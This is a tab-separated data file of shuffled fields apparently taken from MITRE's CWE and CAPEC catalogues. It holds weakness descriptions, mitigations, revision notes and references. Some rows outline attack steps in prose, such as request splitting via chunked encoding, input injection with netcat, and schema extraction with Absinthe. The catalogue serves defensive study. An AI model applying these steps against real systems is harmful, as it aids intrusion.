6776	52	This weakness is only detectable using white box methods (see black box detection factor). Careful analysis is required to determine if the code is likely to be removed by the compiler.
7598	31	1000
20257	28	CWE Content Team
8478	28	CWE Content Team
23013	35	MITRE
18919	39	2009-10-29
17476	66	Strange Attractors and TCP/IP Sequence Number Analysis
11165	56	ChildOf
19663	72	An attacker could gain unauthorized access to internal program variables and execute arbitrary code.
10277	35	MITRE
10012	90	C
14070	104	940
7462	35	MITRE
12927	62	updated Related_Attack_Patterns
20545	76	2015-11-09
20487	35	MITRE
16859	74	4
14155	88	Improper Handling of Highly Compressed Data (Data Amplification)
11381	42	Ensure that the source code correctly parses the filename to read or write to the correct stream.
19147	53	The MITRE Corporation
13456	73	Post a malicious HTTP Request utilizing "Transfer Encoding: chunked" in the request header to cause request splitting
21454	55	CAPEC Content Team
18900	97	Session Fixation
15283	50	Implementation: Perform output validation for all remote content.
19382	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Relationships
15947	36	http://www.owasp.org/index.php/Testing_for_Cross_site_scripting
24127	81	Confidentiality
14598	35	MITRE
16503	91	Implementation
6929	23	The software does not handle or incorrectly handles an exceptional condition.
23622	45	Variant
15031	39	2011-09-13
13226	56	ChildOf
14749	56	ChildOf
24725	74	3
13917	26	Architecture and Design
23754	62	updated Relationships
20854	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
19908	35	MITRE
5802	90	Perl
16235	61	Draft
17524	100	The MITRE Corporation
19348	62	updated Time_of_Introduction
16972	28	CWE Content Team
5618	59	Updated Related_Attack_Patterns
24735	23	The software does not initialize a critical resource.
20592	76	2017-05-01
15796	39	2019-06-20
6122	103	Primary
6323	83	v4 [DRAFT]
21657	69	Stable
21252	62	updated Description, Potential_Mitigations
10789	86	http://developer.android.com/training/articles/security-tips.html#ContentProviders
24985	56	ChildOf
18797	42	Remove debug code before deploying the application.
17390	62	updated Common_Consequences
23794	54	Medium
14996	80	If analyzing the Windows registry, the adversary must understand the registry structure to know where to look for devices.
16172	48	02
8178	103	Primary
6794	39	2014-07-30
24328	80	knowledge of Flash internals, parameters and remote referencing.
21805	31	1000
25063	28	CWE Content Team
19642	62	added/updated demonstrative examples
24959	90	Java
15501	43	Simple
21661	48	06
17874	62	updated Common_Consequences
15582	39	2008-09-08
23561	81	Availability
12872	72	The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.
10569	39	2011-06-27
18172	63	Bypass Protection Mechanism
11415	35	MITRE
15586	95	[Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.
14888	90	Language-Independent
20567	101	CAPEC Content Team
7461	56	ChildOf
9782	39	2019-01-03
10159	39	2014-07-30
9277	39	2010-12-13
9651	101	CAPEC Content Team
8789	62	updated Detection_Factors
19723	23	The software does not enforce or incorrectly enforces that structured messages or data are well-formed before being read from an upstream component or sent to a downstream component.
16347	39	2008-09-08
21531	35	MITRE
8288	39	2010-12-13
15698	101	CAPEC Content Team
23286	91	Architecture and Design
23266	100	The MITRE Corporation
21609	35	MITRE
10334	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '/dir/../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for "../" at the beginning of the input, so a "/../" can bypass that check.
8808	35	Cigital
21514	62	updated Relationships
16148	25	High
23100	39	2011-06-01
13938	35	MITRE
22267	56	ChildOf
24637	86	http://reports-archive.adm.cs.cmu.edu/anon/2008/CMU-CS-08-152.pdf
7343	62	updated References and Observed_Examples
8230	101	CAPEC Content Team
23037	23	The code is structured in a way that a Halstead complexity      measure exceeds a desirable maximum.
16345	35	MITRE
7333	35	MITRE
15283	50	Design: Utilize strict type, character, and encoding enforcement
25220	94	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
17622	91	Operation
6284	23	The adversary modifies state information maintained by the target software in user-accessible locations. If successful, the target software will use this tainted state information and execute in an unintended manner. State management is an important function within an application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.
16878	28	CWE Content Team
17835	35	MITRE
13984	86	http://www.cs.indiana.edu/cgi-pub/cshue/research/woot08.pdf
14956	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References
17208	90	Java
24260	31	1000
19649	31	1000
20885	28	Eric Dalci
21367	28	CWE Content Team
5617	28	CWE Content Team
12319	56	ChildOf
17690	76	2018-07-31
11882	90	Language-Independent
16722	55	CAPEC Content Team
9942	39	2019-06-20
24351	39	2017-11-08
16778	33	Robert Seacord
16454	39	2012-10-30
9888	23	The application calls free() on a pointer to a memory resource that was allocated on the heap, but the pointer is not at the start of the buffer.
5702	28	CWE Content Team
18374	28	Eric Dalci
19937	61	Draft
25387	23	An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.
23393	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
6305	35	MITRE
18642	77	Other
6394	23	Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.
25082	103	Primary
22608	28	CWE Content Team
10686	31	1000
11777	88	Using Referer Field for Authentication
20766	104	804
18396	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
16744	31	699
7307	86	http://codahale.com/how-to-safely-store-a-password/
23089	39	2011-06-27
16141	56	ChildOf
7495	39	2012-10-30
6502	95	[Identify HTTP parsing chain] Determine the technologies used in the target environment such as types of web servers, application firewalls, proxies, etc.
8612	50	Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.
10111	78	High
21786	35	Veracode
22025	35	MITRE
21646	90	Java
13600	104	603
13075	28	CWE Content Team
11430	31	709
12846	62	updated References, Relationships, Taxonomy_Mappings
12222	35	MITRE
22700	35	Cigital
22311	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.
6898	39	2019-01-03
18337	35	MITRE
13832	62	added/updated white box definitions
8401	45	Base
20458	100	The MITRE Corporation
24059	55	CAPEC Content Team
15625	35	MITRE
19395	45	Base
24769	62	updated Type
11823	103	Primary
15872	59	Updated References, Related_Weaknesses
23742	63	DoS: Crash, Exit, or Restart
18079	47	Read Data
11102	35	MITRE
5813	25	Low
20261	74	3
23595	102	ChildOf
11063	62	updated Relationships
15379	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
12875	62	updated Description, Maintenance_Notes, Name, Relationships, Relevant_Properties, Taxonomy_Mappings
7810	62	updated Common_Consequences
10590	27	A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.
17850	62	updated Applicable_Platforms, Common_Consequences, Description, Other_Notes, Potential_Mitigations, Relationship_Notes, Theoretical_Notes, Time_of_Introduction
14693	28	CWE Content Team
21492	35	MITRE
10999	47	Gain Privileges
9116	45	Variant
17260	50	Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.
10661	39	2018-03-27
9429	39	2009-12-28
12704	28	CWE Content Team
24782	35	MITRE
10988	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples
7743	28	CWE Content Team
24427	40	The target host exposes an API to the user.
17198	81	Integrity
7654	72	When the resource is released, the software might modify some of its structure, or close associated channels (such as a file descriptor). When the software later accesses the resource as if it is valid, the resource might not be in an expected state, leading to resultant errors that may lead to a crash.
14496	55	CAPEC Content Team
5760	39	2008-09-08
6538	31	1003
7106	39	2014-07-30
22639	28	CWE Content Team
21172	78	High
6912	50	Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.
6653	35	MITRE
13073	67	High
15890	62	updated Time_of_Introduction
5838	23	The J2EE application directly manages connections, instead of using the container's connection management facilities.
11758	62	updated Maintenance_Notes, Potential_Mitigations
21142	55	CAPEC Content Team
15809	35	MITRE
13695	35	MITRE
10799	35	MITRE
7387	39	2019-06-20
12051	35	MITRE
23938	88	Unrestricted Upload of File with Dangerous Type
14418	73	Use network-level packet injection tools such as netcat to inject input
20619	23	The software displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.
8068	39	2011-06-27
21140	56	ChildOf
6855	78	Medium
9415	62	updated Potential_Mitigations
10680	63	Gain Privileges or Assume Identity
7586	35	MITRE
9814	43	Simple
9429	62	updated Time_of_Introduction
7521	62	updated References, Related_Attack_Patterns, Relationships
15160	28	CWE Content Team
9010	28	CWE Content Team
15118	35	MITRE
8556	28	CWE Content Team
19024	42	Refactor the code so that it does not need to be dynamically managed.
11548	35	Cigital
16820	32	The Open Web Application Security Project (OWASP)
5704	26	Architecture and Design
18588	23	The program sends non-cloned mutable data as an argument to a method or function.
7143	35	MITRE
7739	26	Implementation
11937	59	Updated Related_Weaknesses
12017	35	MITRE
7632	47	Modify Data
9755	101	CAPEC Content Team
12364	91	Testing
6234	59	Updated Description Summary, Other_Notes, Related_Attack_Patterns
13704	62	updated Common_Consequences, Demonstrative_Examples, Related_Attack_Patterns
10826	91	Implementation
11151	69	Incomplete
19040	96	2008-09-09
20401	81	Integrity
16410	102	ChildOf
16822	85	494
11682	62	updated Demonstrative_Examples
16609	35	MITRE
9857	56	ChildOf
17129	35	MITRE
23508	35	MITRE
23008	59	Updated Description Summary, Related_Weaknesses
15982	28	CWE Content Team
6741	35	MITRE
22613	35	MITRE
13279	39	2008-09-08
11334	39	2009-12-28
18035	63	Quality Degradation
12096	35	MITRE
23411	42	Define a clear policy for network resource allocation and consumption.
19855	62	updated Demonstrative_Examples, Related_Attack_Patterns
20996	62	updated Time_of_Introduction
22857	59	Updated Related_Attack_Patterns
12630	63	DoS: Crash, Exit, or Restart
20145	55	CAPEC Content Team
17722	28	CWE Content Team
15808	28	CWE Content Team
17949	26	Architecture and Design
17607	39	2011-06-27
15813	59	Updated Related_Attack_Patterns
25278	43	Simple
19014	62	updated Potential_Mitigations, References, Relationships
11436	101	CAPEC Content Team
17210	32	RedTeam Pentesting GmbH
16326	104	646
5756	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
20442	48	03
12154	28	CWE Content Team
16050	28	CWE Content Team
17782	62	updated Relationships, Taxonomy_Mappings
18070	39	2009-03-10
20914	35	MITRE
8525	62	updated Relationships
24599	28	CWE Content Team
8484	35	MITRE
23723	78	Medium
5681	23	An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.
22261	35	MITRE
6018	33	Microsoft Corporation
13312	104	626
20054	63	Read Application Data
17110	28	CWE Content Team
24424	81	Access Control
21193	90	Language-Independent
20322	92	Exploit
20613	28	CWE Content Team
14031	62	updated Applicable_Platforms, Likelihood_of_Exploit, Time_of_Introduction
20000	39	2009-05-27
11873	79	Integrity
18090	39	2019-01-03
11847	39	2012-10-30
21772	93	Limited
24589	35	MITRE
21322	62	updated Potential_Mitigations, Time_of_Introduction
22686	34	If an application has this design problem, then it can be easier for the developer to make implementation-related errors such as CWE-271 (Privilege Dropping / Lowering Errors). In addition, the consequences of Privilege Chaining (CWE-268) can become more severe.
13326	78	High
25117	28	CWE Content Team
10832	39	2011-06-01
10764	35	MITRE
8150	62	updated Description
11608	63	Read Application Data
22448	39	2011-06-01
15644	62	updated Relationships, Other_Notes
8060	61	Draft
6873	56	ChildOf
21847	28	CWE Content Team
16406	35	MITRE
17601	86	http://seclists.org/fulldisclosure/2006/Sep/0185.html
18376	47	Gain Privileges
16326	46	An application might use the file name or extension of of a user-supplied file to determine the proper course of action, such as selecting the correct process to which control should be passed, deciding what data should be made available, or what resources should be allocated. If the attacker can cause the code to misclassify the supplied file, then the wrong action could occur. For example, an attacker could supply a file that ends in a ".php.gif" extension that appears to be a GIF image, but would be processed as PHP code. In extreme cases, code execution is possible, but the attacker could also cause exhaustion of resources, denial of service, exposure of debug or system data (including application source code), or being bound to a particular server side process. This weakness may be due to a vulnerability in any of the technologies used by the web and application servers, due to misconfiguration, or resultant from another flaw in the application itself.
19301	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21443	26	Implementation
13140	35	Cigital
16314	43	Simple
7991	27	A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.
13240	85	456
16514	28	CWE Content Team
20028	28	CWE Content Team
23439	35	MITRE
15834	46	The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.
22863	35	KDM Analytics
18568	62	updated Applicable_Platforms, Description, Relationships, Other_Notes, Taxonomy_Mappings
24828	35	MITRE
12396	77	Dynamic Analysis with Automated Results Interpretation
18468	28	CWE Content Team
21139	23	The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.
11800	103	Primary
20074	90	C
13178	39	2009-07-27
20083	76	2015-11-09
13092	21	PLOVER
6899	35	Cigital
9752	88	Inappropriate Encoding for Output Context
18639	77	Automated Static Analysis
11977	35	MITRE
19040	21	CWE Content Team
14463	25	High
23091	23	The software performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.
8870	28	Eric Dalci
6832	62	updated References, Relationships
13596	28	CWE Content Team
5802	45	Base
19750	50	Make sure that all session tokens use a good source of randomness
22088	28	CWE Content Team
14770	62	updated Description, Modes_of_Introduction, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
17871	59	Updated @Abstraction
14454	69	Incomplete
13240	89	Standard
11108	28	CWE Content Team
23995	62	updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
11858	69	Incomplete
24423	62	updated Relationships
10871	72	The assignment will not take place, which should cause obvious program execution problems.
5672	62	updated Relationships
19705	39	2008-09-08
23313	47	Modify Data
22469	23	The software uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.
12205	28	CWE Content Team
20379	43	Simple
13486	62	updated Relationships, Taxonomy_Mappings
12267	39	2008-07-01
11798	39	2008-10-14
23473	62	updated Applicable_Platforms
5650	35	Cigital
21123	92	Explore
13406	26	Implementation
22868	28	CWE Content Team
10841	76	2018-07-31
13207	88	Improper Handling of Additional Special Element
24012	49	2018
20941	28	CWE Content Team
9192	39	2008-11-24
17390	28	CWE Content Team
14384	79	Authentication
7716	25	Low
12288	38	Too many false or invalid queries to the database, especially those caused by malformed input.
20794	42	Test your code on the newest and oldest platform on which it is targeted to run on.
18815	91	Architecture and Design
6628	28	CWE Content Team
19944	26	Implementation
9360	26	Implementation
19253	73	Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.
6233	39	2012-05-11
23747	55	CAPEC Content Team
8060	78	High
12072	42	Check for expired certificates and provide the user with adequate information about the nature of the problem and how to proceed.
8569	62	updated Demonstrative_Examples, References, Relationships, Type
10584	90	Language-Independent
22882	100	The MITRE Corporation
18546	104	500
7144	42	Choose a language that provides automatic memory management.
16657	39	2017-05-03
22799	28	Eric Dalci
18056	56	ChildOf
18029	62	updated Time_of_Introduction
20735	39	2010-12-13
14760	62	updated Modes_of_Introduction, Relationships, Relevant_Properties
10807	39	2009-05-27
21299	66	A Taxonomy of Security Faults in the UNIX Operating System
10758	62	updated Demonstrative_Examples, Relationships
25283	28	CWE Content Team
11114	101	CAPEC Content Team
7267	35	MITRE
8402	28	CWE Content Team
18787	43	Simple
18018	57	Indirect
23130	77	Automated Static Analysis - Source Code
18170	62	updated Common_Consequences
18316	35	MITRE
14379	104	829
7957	35	MITRE
9935	100	The MITRE Corporation
17336	35	MITRE
17683	61	Draft
11344	66	SQL Injection Prevention Cheat Sheet
10742	91	Architecture and Design
24069	63	DoS: Resource Consumption (Memory)
6343	93	Limited
20109	35	MITRE
11128	28	CWE Content Team
7859	89	Standard
13680	47	Read Data
9967	35	MITRE
22296	79	Non-Repudiation
11170	35	MITRE
10847	26	Implementation
9776	39	2017-11-08
17476	33	Michal Zalewski
24399	23	A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).
10375	26	Architecture and Design
10777	91	System Configuration
23385	26	Architecture and Design
16615	55	CAPEC Content Team
6442	35	MITRE
22934	26	Architecture and Design
14785	62	updated Other_Notes
7652	39	2009-03-10
15987	39	2009-10-29
5944	31	699
12311	45	Base
22863	62	added/updated white box definitions
24685	62	updated Background_Details, Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations
23233	28	CWE Content Team
12559	76	2019-09-30
17983	91	Testing
9060	35	MITRE
13583	31	699
7065	62	updated Potential_Mitigations
10839	100	The MITRE Corporation
20732	62	updated References, Relationships, Taxonomy_Mappings
18285	31	699
14653	31	1000
5772	28	CWE Content Team
20868	39	2009-07-27
7203	45	Variant
25271	62	updated Common_Consequences
15615	88	Public Static Final Field References Mutable Object
11231	35	MITRE
5582	28	CWE Content Team
19996	28	CWE Content Team
9549	56	ChildOf
8450	100	The MITRE Corporation
19630	31	699
13834	31	1000
24205	35	MITRE
18398	35	MITRE
22549	31	1000
14111	79	Confidentiality
21358	28	Eric Dalci
18715	81	Integrity
13077	35	MITRE
20614	35	MITRE
18930	28	CWE Content Team
17787	91	Architecture and Design
25112	39	2010-09-27
12756	103	Primary
23514	47	Gain Privileges
9783	94	Run Arbitrary Code
23341	33	Wikipedia
14135	62	updated Potential_Mitigations
24231	39	2009-03-10
23471	56	ChildOf
22193	24	MITRE
23741	71	2009
14434	62	updated Relationships
8308	90	Language-Independent
5690	39	2010-06-21
20157	35	MITRE
7970	76	2018-07-31
21942	35	MITRE
8541	35	MITRE
16064	28	CWE Content Team
22515	28	CWE Content Team
18529	103	Primary
18526	28	CWE Content Team
6477	35	MITRE
23178	51	2014-06-23
12539	97	Creating a Rogue Certification Authority Certificate
5936	89	Detailed
8145	88	Use of Singleton Pattern Without Synchronization in a Multithreaded Context
9653	35	MITRE
15268	35	MITRE
8753	25	High
15114	62	updated Potential_Mitigations
10795	57	Primary
11765	62	updated Demonstrative_Examples
18011	103	Primary
10126	62	updated Description
25325	39	2008-11-24
9661	39	2012-05-11
19104	103	Primary
7777	102	ChildOf
11235	81	Confidentiality
14594	95	Identify places in the system where vulnerable MIME conversion routines may be used.
25375	42	Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.
17676	46	As data is parsed, improperly handled trailing special elements may cause the process to take unexpected actions that result in an attack.
20101	39	2012-05-11
6496	39	2008-07-01
23684	28	CWE Content Team
18438	79	Confidentiality
19584	100	The MITRE Corporation
8468	35	MITRE
7810	35	MITRE
14374	60	10
7001	92	Explore
10367	62	updated Alternate_Terms, Relationships
22900	57	Primary
14106	28	CWE Content Team
22219	79	Accountability
15094	103	Primary
20470	104	732
19912	51	2014-06-23
24123	35	MITRE
8148	28	CWE Content Team
12787	35	MITRE
6074	47	Gain Privileges
20791	39	2010-02-16
18544	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
21853	39	2011-06-01
19637	63	Read Files or Directories
7265	35	MITRE
14907	42	Always verify the integrity of the software that is being installed.
9957	26	Architecture and Design
23549	90	Language-Independent
23343	62	updated Time_of_Introduction
14672	50	Implementation: Hide cookie's software information filed.
14282	28	CWE Content Team
11687	39	2019-06-20
24894	35	Cigital
15917	43	Simple
11695	39	2008-07-01
9191	62	updated Time_of_Introduction
12467	39	2008-09-08
9488	101	CAPEC Content Team
19879	56	ChildOf
21129	45	Variant
13358	39	2014-07-30
24796	31	1003
16684	95	[Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.
23959	21	CLASP
11903	89	Detailed
24950	35	MITRE
18097	39	2009-07-27
14933	23	The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input.
12778	35	MITRE
12021	42	Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.
8737	21	CWE Content Team
22253	31	1000
18815	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
13610	39	2008-09-08
15995	55	CAPEC Content Team
18823	92	Exploit
14645	95	[Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.
19799	42	Ensure that all string functions used are understood fully as to how they append null characters. Also, be wary of off-by-one errors when appending nulls to the end of strings.
20134	62	updated Common_Consequences
22783	39	2011-03-29
10837	39	2010-04-05
11670	81	Access Control
8855	81	Availability
24356	24	MITRE
7300	70	Google Cross-Site Scripting HOWTO article
12549	56	ChildOf
17758	81	Confidentiality
13699	23	An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse. RFID (Radio Frequency Identification) are passive devices which consist of an integrated circuit for processing RF signals and an antenna. RFID devices are passive in that they lack an on on-board power source. The majority of RFID chips operate on either the 13.56 MHz or 135 KHz frequency. The chip is powered when a signal is received by the antenna on the chip, powering the chip long enough to send a reply message. An attacker is able to capture and analyze RFID data by either stimulating the chip to respond or being proximate to the chip when it sends a response to a remote transmitter. This allows the attacker to duplicate the signal and conduct attacks such as gaining unauthorized access to a building or impersonating a user's identification.
19001	39	2008-07-01
6029	73	Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).
22232	28	CWE Content Team
10170	79	Confidentiality
16060	101	CAPEC Content Team
18220	62	updated Relationships
13349	43	Simple
21346	62	updated Time_of_Introduction
8725	62	updated Common_Consequences
14933	58	In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.
17803	23	This type of attack targets the communication between two components (typically client and server). The attacker places himself in the communication channel between the two components. Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first goes to the attacker, who has the opportunity to observe or alter it, and it is then passed on to the other component as if it was never observed. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for Man-in-the-Middle attacks yields an implicit lack of trust in communication or identify between two components. MITM attacks differ from sniffing attacks since they often modify the communications prior to delivering it to the intended recipient. These attacks also differ from interception attacks since they may forward the sender's original unmodified data, after copying it, instead of keeping it for themselves.
18439	91	Operation
6886	71	2005
18693	35	MITRE
23489	86	http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/
6629	35	MITRE
9755	76	2019-09-30
13974	35	MITRE
14413	101	CAPEC Content Team
20701	39	2011-03-24
8177	85	498
7969	56	ChildOf
15961	35	MITRE
10026	40	Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.
6907	62	updated Description
23554	100	The MITRE Corporation
20406	51	2014-06-23
9093	31	1000
7188	62	updated References, Relationships, Taxonomy_Mappings
12519	28	CWE Content Team
24508	62	updated Demonstrative_Examples, Relationships
7709	62	updated Common_Consequences
15263	81	Availability
10815	28	CWE Content Team
12222	62	updated Relationships
23740	80	Determine if Lan Man and NT Lan Man authentication is allowed on the server.
25318	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
19807	30	Fortify
21496	31	1000
22408	72	Initial variables usually contain junk, which can not be trusted for consistency. This can lead to denial of service conditions, or modify control flow in unexpected ways. In some cases, an attacker can "pre-initialize" the variable using previous actions, which might enable code execution. This can cause a race condition if a lock variable check passes when it should not.
21739	62	updated Potential_Mitigations, Relationship_Notes, Relationships
9108	103	Primary
21958	35	MITRE
10097	103	Primary
7858	26	Implementation
6124	35	MITRE
18974	81	Availability
9197	39	2012-10-30
19754	28	CWE Content Team
8824	39	2013-02-21
9468	35	MITRE
19088	62	updated Common_Consequences
21824	25	High
11326	43	Simple
18200	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
7554	39	2012-05-11
13653	89	Detailed
12204	62	updated Relationships, Taxonomy_Mappings
12698	31	1000
10758	35	MITRE
23629	39	2008-09-08
22776	103	Primary
6344	47	Read Data
13537	97	Carry-Off GPS Attack
10974	88	J2EE Misconfiguration: Missing Custom Error Page
7523	96	2009-12-04
12616	26	Implementation
7542	23	An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.
14229	28	CWE Content Team
11598	62	updated Common_Consequences
19291	102	ChildOf
9505	39	2017-05-03
18971	39	2009-05-27
16586	62	updated Demonstrative_Examples
7331	28	CWE Content Team
14933	69	Incomplete
6941	79	Confidentiality
16430	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Typical_Likelihood_of_Exploit, Typical_Severity
23052	62	updated Common_Consequences, Demonstrative_Examples, Description, Other_Notes, Relationship_Notes, Theoretical_Notes
9406	39	2019-06-20
19469	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
24904	81	Confidentiality
23774	35	MITRE
6251	35	MITRE
15979	28	CWE Content Team
11546	39	2008-07-01
10489	33	Herbert Schildt
22048	47	Read Data
23351	85	124
12422	69	Incomplete
22992	100	The MITRE Corporation
22472	104	639
24097	88	Inconsistency Between Implementation and Documented Design
11081	25	Medium
13167	103	Primary
17750	28	CWE Content Team
10537	35	MITRE
22533	42	If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.                   Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]
23298	62	updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
6809	97	Session Hijacking
22111	100	The MITRE Corporation
13362	91	Implementation
16030	63	DoS: Crash, Exit, or Restart
20557	76	2017-08-04
22089	81	Confidentiality
10378	61	Draft
6739	51	2014-06-23
13827	62	updated Common_Consequences
15147	31	1000
6361	81	Integrity
20249	45	Class
24387	103	Primary
16963	86	http://www.microsoft.com/technet/security/advisory/2269637.mspx
8345	97	Hardware Design Specifications Are Altered
19597	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
22145	35	MITRE
6950	57	Primary
8542	79	Availability
8566	43	Simple
13649	62	updated Potential_Mitigations
11540	28	CWE Content Team
25014	74	2
16688	61	Draft
7867	21	CWE Content Team
24848	47	Modify Data
11504	101	CAPEC Content Team
15386	79	Confidentiality
19778	24	MITRE
11411	28	CWE Content Team
20078	63	Modify Memory
17966	100	The MITRE Corporation
17469	42	Limit Content Provider permissions (read/write) as appropriate.
19776	28	CWE Content Team
18165	28	CWE Content Team
23440	35	MITRE
16027	31	1000
22040	27	None: No specialized resources are required to execute this type of attack.
23527	81	Integrity
11880	104	1085
10196	102	CanPrecede
9281	76	2015-12-07
18756	88	Information Exposure Through Directory Listing
11268	63	Bypass Protection Mechanism
13371	28	CWE Content Team
17315	90	Language-Independent
21048	39	2010-09-27
16993	39	2012-10-30
7571	63	Modify Files or Directories
22420	73	Automatically extract database schema using a tool such as Absinthe.
12836	31	699
6363	42	In some cases, you can eliminate the clone method altogether and use copy constructors.
19692	89	Detailed
8979	79	Confidentiality
17218	23	A software system that accepts path input in the form of multiple trailing dot ('filedir....') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
14924	103	Primary
5915	88	Use of Password Hash With Insufficient Computational Effort
22751	88	Response Discrepancy Information Exposure
9697	21	7 Pernicious Kingdoms
9777	39	2009-05-27
8743	79	Confidentiality
